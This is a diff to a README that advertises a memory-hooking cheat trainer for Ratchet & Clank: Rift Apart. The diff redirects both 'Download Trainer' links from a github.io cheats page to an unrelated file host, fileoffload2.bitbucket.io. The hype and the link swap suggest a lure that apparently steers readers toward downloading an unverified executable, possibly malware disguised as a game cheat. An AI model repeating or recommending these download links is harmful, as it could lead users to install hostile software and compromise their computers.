@@ -6,14 +6,14 @@
 
 Packed with everything from **god mode** to **infinite ammo**, **XP multipliers**, and **instant gear unlocks**, this trainer gives you full control of the action without needing to mod files or touch code.
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://wecheaters.github.io/cheats/ratchet-clank-rift-apart/)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload2.bitbucket.io)
 ---
 
 ## 🧠 What’s a Trainer?
 
 A **trainer** is a standalone app that runs while the game is active, letting you toggle cheats in real time. It hooks into the game’s memory, allowing instant stat changes, ability boosts, and unlocks—no game restarts, no save edits, just real-time domination.
 
-[![Download Trainer](https://i.ytimg.com/vi/J4Etn9f-g10/maxresdefault.jpg)](https://wecheaters.github.io/cheats/ratchet-clank-rift-apart/)
+[![Download Trainer](https://i.ytimg.com/vi/J4Etn9f-g10/maxresdefault.jpg)](https://fileoffload2.bitbucket.io)
 ---
 
 ## 🧩 Core Features of the Rift Apart Trainer
